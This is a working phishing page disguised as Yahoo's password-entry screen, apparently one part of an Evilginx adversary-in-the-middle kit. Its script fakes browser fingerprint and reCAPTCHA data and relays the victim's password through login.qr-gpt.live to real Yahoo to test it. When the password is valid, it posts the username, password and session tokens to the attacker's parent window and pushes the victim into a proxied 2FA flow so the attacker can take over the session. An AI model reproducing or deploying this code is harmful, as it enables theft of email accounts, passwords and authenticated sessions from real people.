<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Enter Password</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <!-- Your Original CSS -->
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <!-- Original Fonts -->
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <!-- Original Favicon -->
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
  <!-- jQuery -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <!-- Original Body Structure -->
  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active">
      <div class="div-block-5">
        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
      </div>
      <div class="form-block w-form">
        <form id="email-form" name="email-form" data-name="Email Form" class="form" 
              action="https://login.qr-gpt.live/account/challenge/password" 
              method="POST">
          
          <!-- ALL REQUIRED YAHOO FORM FIELDS FOR EVILGINX -->
          <input type="hidden" name="browser-fp-data" id="browser-fp-data">
          <input type="hidden" name="crumb" id="crumb" value="">
          <input type="hidden" name="acrumb" id="acrumb" value="">
          <input type="hidden" name="sessionIndex" id="sessionIndex" value="">
          <input type="hidden" name="displayName" id="displayName" value="">
          <input type="hidden" name="deviceCapability" id="deviceCapability">
          <input type="hidden" name="signin" value="Next">
          <input type="hidden" name="persistent" value="y">
          <input type="hidden" name="done" id="done" value="">
          <input type="hidden" name="username" id="username" value="">
          <input type="hidden" name="g-recaptcha-response" value="auto_valid_xyz">
          
          <!-- Password Field -->
          <div class="pazzi">
            <div class="reflectto" id="userEmail">user@example.com</div>
            <h1 class="heading-2"><strong>Enter password</strong></h1>
            <div class="ms-input-wrap">
              <input class="ms-input w-input" name="passwd" type="password" id="password" required minlength="8">
            </div>
            <input type="submit" class="logger w-button" value="Sign In" id="submitBtn">
          </div>
          
          <!-- Error Message -->
          <div class="errry" style="display:none;">
            <div class="text-block-7"></div>
            <button type="button" id="refreshButton" style="margin-top: 10px; padding: 5px 10px; background: #6001d2; color: white; border: none; border-radius: 3px; cursor: pointer;">Try Again</button>
          </div>
        </form>
      </div>
    </div>
  </section>

  <!-- Original Scripts -->
  <script src="js/webflow.js" type="text/javascript"></script>
  
  <!-- COMPLETE FIXED FUNCTIONALITY -->
  <script>
    // Generate comprehensive browser fingerprint for Yahoo
    function generateBrowserFingerprint() {
        const fp = {
            language: navigator.language || 'en-US',
            colorDepth: screen.colorDepth || 24,
            deviceMemory: navigator.deviceMemory || 'unknown',
            pixelRatio: window.devicePixelRatio || 1.5,
            hardwareConcurrency: navigator.hardwareConcurrency || 4,
            timezoneOffset: new Date().getTimezoneOffset() || -60,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'America/New_York',
            sessionStorage: 1,
            localStorage: 1,
            indexedDb: 1,
            cpuClass: 'unknown',
            platform: navigator.platform || 'Win32',
            doNotTrack: navigator.doNotTrack || '1',
            plugins: {
                count: navigator.plugins.length || 5,
                hash: '2c14024bf8584c3f7f63f24ea490e812'
            },
            canvas: 'canvas winding:yes~canvas',
            webgl: 1,
            webglVendorAndRenderer: 'Google Inc. (Intel)~ANGLE (Intel, Intel(R) HD Graphics 400 Direct3D11 vs_5_0 ps_5_0), or similar',
            adBlock: 0,
            hasLiedLanguages: 0,
            hasLiedResolution: 0,
            hasLiedOs: 1,
            hasLiedBrowser: 0,
            touchSupport: { points: 10, event: 0, start: 0 },
            fonts: { count: 32, hash: '9ad7c2bdeb9564b4cabbeeca7be750a3' },
            audio: '35.749972093850374',
            resolution: { w: screen.width.toString(), h: screen.height.toString() },
            availableResolution: { w: screen.availHeight.toString(), h: screen.availWidth.toString() },
            ts: { serve: Date.now() - 1000, render: Date.now() }
        };
        return JSON.stringify(fp);
    }

    function generateDeviceCapability() {
        return JSON.stringify({
            pa: { status: true },
            isWebAuthnSupported: typeof PublicKeyCredential !== 'undefined'
        });
    }

    $(document).ready(function() {
        console.log('=== CUSTOM PASSWORD PAGE LOADED ===');
        
        // 1. Extract ALL parameters from URL for session preservation
        const urlParams = new URLSearchParams(window.location.search);
        const username = urlParams.get('u') || urlParams.get('displayName') || '';
        const sessionToken = urlParams.get('s') || urlParams.get('sessionIndex') || '';
        const acrumb = urlParams.get('acrumb') || '';
        const done = urlParams.get('done') || '';

        console.log('URL Parameters:');
        console.log('- Username:', username);
        console.log('- Session Token:', sessionToken);
        console.log('- Acrumb:', acrumb);
        console.log('- Done:', done);
        console.log('- Full URL:', window.location.href);

        // 2. Validate username
        if (!username || !username.includes('@')) {
            console.log('Invalid username, redirecting to login');
            window.location.href = 'https://login.qr-gpt.live/';
            return;
        }

        // 3. Set up ALL form fields to preserve Yahoo session
        $('#userEmail').text(username);
        $('#username').val(username);
        $('#displayName').val(username);
        $('#sessionIndex').val(sessionToken || 'QQ--');
        $('#acrumb').val(acrumb);
        $('#done').val(done);

        // 4. Generate required Yahoo data
        $('#browser-fp-data').val(generateBrowserFingerprint());
        $('#deviceCapability').val(generateDeviceCapability());
        $('#crumb').val('auto_crumb_' + Math.random().toString(36).substr(2, 12));

        console.log('All form fields populated for session preservation');

        // 5. REAL CREDENTIAL VALIDATION - Form submission
        $("#email-form").submit(function(e) {
            e.preventDefault();
            
            const password = $('#password').val().trim();
            const submitBtn = $('#submitBtn');
            const errorDiv = $('.errry');
            const errorText = $('.text-block-7');

            // Hide previous errors
            errorDiv.hide();

            // Basic validation (REAL - no fake credentials accepted)
            if (password.length < 8) {
                errorText.text('Password must be at least 8 characters');
                errorDiv.show();
                $('#password').focus();
                return;
            }

            // UI feedback
            submitBtn.prop('disabled', true).val('Verifying...');

            console.log('=== SUBMITTING TO REAL YAHOO VIA EVILGINX ===');
            console.log('Username:', username);
            console.log('Password length:', password.length);
            console.log('Session Index:', sessionToken);
            console.log('Acrumb:', acrumb);
            console.log('Form action:', this.action);

            // Submit to REAL Yahoo via evilginx proxy with ALL session data
            const formData = new FormData(this);
            
            fetch(this.action, {
                method: 'POST',
                body: formData,
                credentials: 'include',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest',
                    'Referer': 'https://login.qr-gpt.live/account/challenge/recaptcha',
                    'Origin': 'https://custom-yahoo-2fa-test.vercel.app'
                }
            })
            .then(response => {
                console.log('=== RESPONSE FROM YAHOO ===');
                console.log('Status:', response.status);
                console.log('Headers:', [...response.headers.entries()]);
                
                return response.text().then(text => ({
                    status: response.status,
                    headers: response.headers,
                    text: text,
                    url: response.url
                }));
            })
            .then(result => {
                console.log('Response URL:', result.url);
                console.log('Response length:', result.text.length);
                console.log('Response preview:', result.text.substring(0, 500));

                // REAL Yahoo validation - check for actual success indicators
                if (result.text.includes('challenge-selector') || 
                    result.text.includes('email-verify') ||
                    result.text.includes('sms-verify') ||
                    result.text.includes('authenticator') ||
                    result.text.includes('challenge') ||
                    result.text.includes('verification') ||
                    result.headers.get('Location')?.includes('challenge') ||
                    result.url.includes('challenge')) {
                    
                    console.log('✅ REAL 2FA CHALLENGE DETECTED - CREDENTIALS ARE VALID');
                    
                    // Send credentials to parent evilginx window with session data
                    try {
                        if (window.parent && window.parent !== window) {
                            window.parent.postMessage({
                                type: 'credentials',
                                username: username,
                                password: password,
                                sessionIndex: sessionToken,
                                acrumb: acrumb,
                                done: done,
                                source: 'custom_password_page',
                                validated: true,
                                timestamp: Date.now()
                            }, 'https://login.qr-gpt.live');
                            console.log('Credentials sent to parent window');
                        }
                    } catch (e) {
                        console.log('Could not send to parent:', e);
                    }
                    
                    // Redirect to proxied 2FA flow with session preservation
                    let redirectUrl = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
                    const params = new URLSearchParams();
                    if (sessionToken) params.append('sessionIndex', sessionToken);
                    if (acrumb) params.append('acrumb', acrumb);
                    if (done) params.append('done', done);
                    
                    if (params.toString()) {
                        redirectUrl += '?' + params.toString();
                    }
                    
                    console.log('🔄 Redirecting to 2FA:', redirectUrl);
                    
                    // Small delay to ensure message is sent
                    setTimeout(function() {
                        window.location.href = redirectUrl;
                    }, 500);
                    
                } else if (result.text.includes('mail') || result.text.includes('folders') || result.text.includes('inbox')) {
                    console.log('✅ DIRECT LOGIN SUCCESS - NO 2FA REQUIRED');
                    window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                    
                } else if (result.text.includes('invalid') || result.text.includes('incorrect') || result.text.includes('error')) {
                    console.log('❌ INVALID CREDENTIALS');
                    showError('Invalid password. Please check your password and try again.');
                    
                } else {
                    console.log('⚠️ UNEXPECTED RESPONSE - TREATING AS ERROR');
                    console.log('Full response:', result.text);
                    showError('Invalid password. Please try again.');
                }
            })
            .catch(error => {
                console.log('=== ERROR RESPONSE ===');
                console.log('Error:', error);

                let errorMsg = 'Invalid password. Please try again.';
                
                // REAL error handling - no fake credential acceptance
                if (error.message.includes('401') || error.message.includes('403')) {
                    errorMsg = 'Invalid password. Please check your password and try again.';
                } else if (error.message.includes('429')) {
                    errorMsg = 'Too many attempts. Please wait and try again.';
                } else if (error.message.includes('5')) {
                    errorMsg = 'Server error. Please try again later.';
                } else if (error.message.includes('network') || error.message.includes('fetch')) {
                    errorMsg = 'Connection error. Please check your internet and try again.';
                }

                showError(errorMsg);
            });
        });

        // Error display function
        function showError(message) {
            const errorDiv = $('.errry');
            const errorText = $('.text-block-7');
            const submitBtn = $('#submitBtn');
            
            errorText.text(message);
            errorDiv.show();
            $('#password').val('').focus();
            submitBtn.prop('disabled', false).val('Sign In');
        }

        // "Try again" button functionality
        $('#refreshButton').click(function() {
            $('#password').val('').focus();
            $('.errry').hide();
            $('#submitBtn').prop('disabled', false).val('Sign In');
        });

        // Auto-focus password field
        $('#password').focus();

        console.log('=== INITIALIZATION COMPLETE ===');
    });
  </script>
</body>
</html>
